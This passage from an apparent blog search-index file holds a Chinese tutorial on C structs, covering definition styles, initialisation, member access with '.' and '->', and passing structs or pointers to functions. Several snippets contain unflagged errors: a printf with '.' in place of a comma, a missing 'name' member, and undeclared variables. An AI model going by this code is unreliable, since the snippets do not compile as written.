class="token punctuation">)</span><span class="token punctuation">;</span>//最终值为6<span class="token punctuation">(</span>float<span class="token punctuation">)</span><span class="token punctuation">(</span>5<span class="token punctuation">)</span><span class="token punctuation">;</span>//最终值为5.000000</code></pre><h2 id="结构体"><a href="#结构体" class="headerlink" title="结构体"></a>结构体</h2><h3 id="为什么需要结构体"><a href="#为什么需要结构体" class="headerlink" title="为什么需要结构体"></a>为什么需要结构体</h3><p>为了表示一些复杂的事物，而普通的基本类型无法满足实际要求</p><h3 id="什么叫结构体"><a href="#什么叫结构体" class="headerlink" title="什么叫结构体"></a>什么叫结构体</h3><p>把一些基本数据类型组合在一起形成的一个新的复合数据类型</p><h3 id="如何定义结构体"><a href="#如何定义结构体" class="headerlink" title="如何定义结构体"></a>如何定义结构体</h3><pre class=" language-bash"><code class="language-bash">//第一种方式<span class="token punctuation">(</span>推荐使用<span class="token punctuation">)</span>struct Student<span class="token punctuation">{</span>   int age<span class="token punctuation">;</span>   float score<span class="token punctuation">;</span>   char sex<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span>//第二种方式struct Student2<span class="token punctuation">{</span>   int age<span class="token punctuation">;</span>   float score<span class="token punctuation">;</span>   char sex<span class="token punctuation">;</span><span class="token punctuation">}</span> student2<span class="token punctuation">;</span>//定义一个名为student2的结构体//第三种方式struct <span class="token punctuation">{</span>   int age<span class="token punctuation">;</span>   float score<span class="token punctuation">;</span>   char sex<span class="token punctuation">;</span><span class="token punctuation">}</span> student1<span class="token punctuation">;</span>int main<span class="token punctuation">(</span>void<span class="token punctuation">)</span><span class="token punctuation">{</span>   struct Student student <span class="token operator">=</span> <span class="token punctuation">{</span>80,66.6,<span class="token string">'F'</span><span class="token punctuation">}</span><span class="token punctuation">;</span>//初始化一个名为student的结构体<span class="token punctuation">}</span></code></pre><h3 id="怎样使用结构体变量"><a href="#怎样使用结构体变量" class="headerlink" title="怎样使用结构体变量"></a>怎样使用结构体变量</h3><h4 id="赋值和初始化"><a href="#赋值和初始化" class="headerlink" title="赋值和初始化"></a>赋值和初始化</h4><pre class=" language-bash"><code class="language-bash">struct Student<span class="token punctuation">{</span>   int age<span class="token punctuation">;</span>   float score<span class="token punctuation">;</span>   char sex<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span>int main<span class="token punctuation">(</span>void<span class="token punctuation">)</span><span class="token punctuation">{</span>   struct Student student <span class="token operator">=</span> <span class="token punctuation">{</span>80,66.6,<span class="token string">'F'</span><span class="token punctuation">}</span><span class="token punctuation">;</span>//初始化，定义的同时赋初值   struct Student student2<span class="token punctuation">;</span>//定义完后再赋值   student2.age <span class="token operator">=</span> 10<span class="token punctuation">;</span>   student2.score <span class="token operator">=</span> 90<span class="token punctuation">;</span>   student2.sex <span class="token operator">=</span> <span class="token string">'F'</span><span class="token punctuation">;</span>   <span class="token keyword">return</span> 0<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h4 id="怎样访问结构体变量中的每一个成员"><a href="#怎样访问结构体变量中的每一个成员" class="headerlink" title="怎样访问结构体变量中的每一个成员"></a>怎样访问结构体变量中的每一个成员</h4><ol><li><p>结构体变量名.成员名</p></li><li><p>指针变量名-&gt;成员名</p><pre class=" language-bash"><code class="language-bash">struct Student<span class="token punctuation">{</span>int age<span class="token punctuation">;</span>float score<span class="token punctuation">;</span>char sex<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span>int main<span class="token punctuation">(</span>void<span class="token punctuation">)</span><span class="token punctuation">{</span>struct Student student <span class="token operator">=</span> <span class="token punctuation">{</span>80,66.6,<span class="token string">'F'</span><span class="token punctuation">}</span><span class="token punctuation">;</span>//初始化，定义的同时赋初值student.age <span class="token operator">=</span> 10<span class="token punctuation">;</span>//第一种方式struct Student *pst <span class="token operator">=</span> <span class="token operator">&amp;</span>student<span class="token punctuation">;</span>//第二种方式pst-<span class="token operator">></span>age <span class="token operator">=</span> 10<span class="token punctuation">;</span>//pst所指向的结构体的age成员<span class="token keyword">return</span> 0<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><blockquote><p>注：pst-&gt;age会在计算机内部转化成(* pst).age</p></blockquote></li></ol><h4 id="结构变量的运算"><a href="#结构变量的运算" class="headerlink" title="结构变量的运算"></a>结构变量的运算</h4><p>结构体变量不能相加、相减，也不能相互乘除,只能赋值</p><pre class=" language-bash"><code class="language-bash">struct Student student1,student2<span class="token punctuation">;</span>student1 <span class="token operator">=</span> student2<span class="token punctuation">;</span></code></pre><p>####　结构变量和结构体变量指针作为函数参数传递问题</p><pre class=" language-bash"><code class="language-bash">//error,不能直接对结构体进行修改void InputStudent1<span class="token punctuation">(</span>st<span class="token punctuation">)</span><span class="token punctuation">{</span>   st.age <span class="token operator">=</span> 10<span class="token punctuation">;</span>   strcpy<span class="token punctuation">(</span>st.name,<span class="token string">"张三"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>//不能写成stu.name<span class="token operator">=</span>“张三”，涉及C语言字符串处理<span class="token punctuation">}</span>//OKvoid InputStudent2<span class="token punctuation">(</span>struct Student * pstu<span class="token punctuation">)</span><span class="token punctuation">{</span>   pstu-<span class="token operator">></span>age <span class="token operator">=</span> 10<span class="token punctuation">;</span>   strcpy<span class="token punctuation">(</span>pstu-<span class="token operator">></span>name,<span class="token string">"张三"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   pstu-<span class="token operator">></span>sex <span class="token operator">=</span> <span class="token string">'F'</span><span class="token punctuation">;</span><span class="token punctuation">}</span>void OutputStudent<span class="token punctuation">(</span>struct Student ss<span class="token punctuation">)</span><span class="token punctuation">{</span>    printf<span class="token punctuation">(</span><span class="token string">"%d %s %c\n"</span>.ss.age,ss.name,ss.sex<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>int main<span class="token punctuation">(</span>void<span class="token punctuation">)</span><span class="token punctuation">{</span>   struct Student student1<span class="token punctuation">;</span>   InputStudent<span class="token punctuation">(</span>st<span class="token punctuation">)</span><span class="token punctuation">;</span>//error,对结构体变量输入   InputStudent2<span class="token punctuation">(</span><span class="token operator">&amp;</span>st<span class="token punctuation">)</span><span class="token punctuation">;</span>//OK   OutputStudent<span class="token punctuation">(</span>st<span class="token punctuation">)</span><span class="token punctuation">;</span>//对结构体变量输出，也可以传指针   <span class="token keyword">return</span> 0<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><blockquote><p>注：对结构体进行修改必须输入结构体的指针</p></blockquote><h2 id=""><a href="#" class="headerlink" title=""></a></h2>]]></content>
      
      
      <categories>
          
          <category> 编程语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
